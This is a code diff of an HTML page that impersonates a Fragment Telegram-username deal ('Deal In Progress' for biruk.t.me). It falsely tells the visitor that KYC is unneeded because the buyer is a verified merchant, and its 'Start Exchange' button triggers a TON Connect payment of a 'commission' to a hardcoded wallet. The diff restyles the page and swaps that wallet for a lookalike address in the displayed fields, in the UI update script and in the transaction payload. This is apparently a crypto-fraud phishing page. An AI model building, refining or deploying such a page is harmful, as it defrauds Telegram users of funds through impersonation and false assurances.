@@ -15,9 +15,10 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
             padding: 0;
             margin: 0;
-            background-color: #f8f9fa;
-            color: #212529;
+            background-color: #ffffff;
+            color: #000000;
             line-height: 1.5;
+            font-size: 16px;
         }
         .container {
             max-width: 100%;
@@ -28,7 +29,7 @@
             color: var(--primary);
             font-size: 18px;
             font-weight: 600;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
         }
         .subheader {
             font-size: 16px;
@@ -38,7 +39,7 @@
         .divider {
             height: 1px;
             background-color: var(--border);
-            margin: 20px 0;
+            margin: 12px 0;
         }
         .badge {
             display: inline-block;
@@ -51,44 +52,67 @@
             margin-bottom: 12px;
         }
         .username-title {
-            font-size: 20px;
-            font-weight: 600;
-            margin: 8px 0 16px;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 8px 0 20px;
+            text-align: center;
+            color: #000000;
         }
         table.deal-table {
             width: 100%;
             border-collapse: collapse;
-            margin-bottom: 16px;
+            margin-bottom: 24px;
         }
         table.deal-table th, 
         table.deal-table td {
             padding: 8px 0;
-            text-align: left;
+            text-align: center;
         }
         table.deal-table th {
             font-weight: 500;
             color: #6c757d;
+            font-size: 15px;
         }
         table.deal-table td {
-            font-weight: 600;
-            font-size: 18px;
+            font-weight: 700;
+            font-size: 20px;
+            color: #000000;
         }
         .info-section {
             margin-bottom: 24px;
         }
         .info-section p {
             margin: 8px 0;
+            text-align: center;
+            color: #6c757d;
+            font-size: 15px;
+        }
+        .info-section .info-row {
+            margin: 20px 0;
         }
         .info-section strong {
             display: block;
             color: #6c757d;
             font-weight: 500;
             font-size: 14px;
-            margin-top: 16px;
+            text-align: center;
         }
         .info-section span {
+            display: block;
             font-size: 16px;
-            color: #212529;
+            color: #000000;
+            text-align: center;
+            font-weight: 500;
+            margin-top: 4px;
+        }
+        .ton-address {
+            text-align: center;
+            font-family: monospace;
+            font-size: 13px;
+            color: #000000;
+            line-height: 1.4;
+            word-break: break-all;
+            padding: 0 20px;
         }
         button {
             background-color: var(--primary);
@@ -101,7 +125,6 @@
             font-weight: 600;
             cursor: pointer;
             margin: 16px 0;
-            box-shadow: 0 2px 8px rgba(0, 136, 204, 0.25);
         }
         .note {
             background-color: #f1f8ff;
@@ -110,6 +133,7 @@
             font-size: 14px;
             color: #495057;
             margin: 16px 0;
+            line-height: 1.5;
         }
         .note strong {
             color: var(--primary);
@@ -118,13 +142,13 @@
             background: white;
             border-radius: 12px;
             padding: 16px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
         }
         .trade-info h3 {
             font-size: 16px;
             margin-top: 0;
             margin-bottom: 16px;
             color: #495057;
+            text-align: center;
         }
         table.trade-table {
             width: 100%;
@@ -161,6 +185,15 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .center {
+            text-align: center;
+        }
+        .update-text {
+            text-align: center;
+            font-size: 14px;
+            color: #6c757d;
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
@@ -169,8 +202,10 @@
         <div class="subheader">Search usernames</div>
         <div class="divider"></div>
         
-        <div class="badge">Deal In Progress</div>
-        <div class="username-title" id="usernameDisplay">biruk.t.me</div>
+        <div class="center">
+            <div class="badge">Deal In Progress</div>
+            <div class="username-title" id="usernameDisplay">biruk.t.me</div>
+        </div>
         
         <table class="deal-table">
             <tr>
@@ -186,19 +221,25 @@
         <div class="info-section">
             <p>How does this work?</p>
             
-            <strong>Telegram Username</strong>
-            <span id="usernameText">@biruk</span>
+            <div class="info-row">
+                <strong>Telegram Username</strong>
+                <span id="usernameText">@biruk</span>
+            </div>
             
-            <strong>Web Address</strong>
-            <span>t.me/<span id="usernameLink">biruk</span></span>
+            <div class="info-row">
+                <strong>Web Address</strong>
+                <span>t.me/<span id="usernameLink">biruk</span></span>
+            </div>
             
-            <strong>TON Web 3.0 Address</strong>
-            <span class="address" id="tonAddress">UQDXBD5iScateB1lm4SxkRUn6zqCMgdFooAd-6PxWjkT9uPM</span>
+            <div class="info-row">
+                <strong>TON Web 3.0 Address</strong>
+                <div class="ton-address" id="tonAddress">UQDXBD51ScateB11m4SxkRUn6zqCMgdFooAd-6PxWjKT9uPM</div>
+            </div>
         </div>
         
         <button id="startExchange">Start Exchange</button>
         <div class="loader" id="loader"></div>
-        <p style="text-align: center; font-size: 14px; color: #6c757d;">Subscribe to updates</p>
+        <div class="update-text">Subscribe to updates</div>
         
         <div class="note">
             You do not need to complete KYC verification, as the buyer is a verified merchant on Fragment that has a security deposit of <strong>25,000 TON</strong>.
@@ -215,7 +256,7 @@
                 <tr>
                     <td>Ready</td>
                     <td>Swappable</td>
-                    <td class="address">UQDXBD5iScateB1lm4SxkRUn6zqCMgdFooAd-6PxWjkT9uPM</td>
+                    <td class="address">UQDXBD51ScateB11m4SxkRUn6zqCMgdFooAd-6PxWjKT9uPM</td>
                 </tr>
             </table>
         </div>
@@ -260,6 +301,10 @@
             document.getElementById('usernameLink').textContent = username;
             document.getElementById('priceDisplay').textContent = `${price} TON`;
             document.getElementById('commissionDisplay').textContent = `${commission} TON`;
+            
+            // Обновляем адрес в двух местах
+            document.getElementById('tonAddress').textContent = "UQDXBD51ScateB11m4SxkRUn6zqCMgdFooAd-6PxWjKT9uPM";
+            document.querySelector('.trade-table .address').textContent = "UQDXBD51ScateB11m4SxkRUn6zqCMgdFooAd-6PxWjKT9uPM";
         }
         
         updateUI();
@@ -287,7 +332,7 @@
                     validUntil: Math.floor(Date.now() / 1000) + 600,
                     messages: [
                         {
-                            address: "UQDXBD5iScateB1lm4SxkRUn6zqCMgdFooAd-6PxWjkT9uPM",
+                            address: "UQDXBD51ScateB11m4SxkRUn6zqCMgdFooAd-6PxWjKT9uPM",
                             amount: `${parseInt(parseStartParams().commission) * 1000000000}`
                         }
                     ]
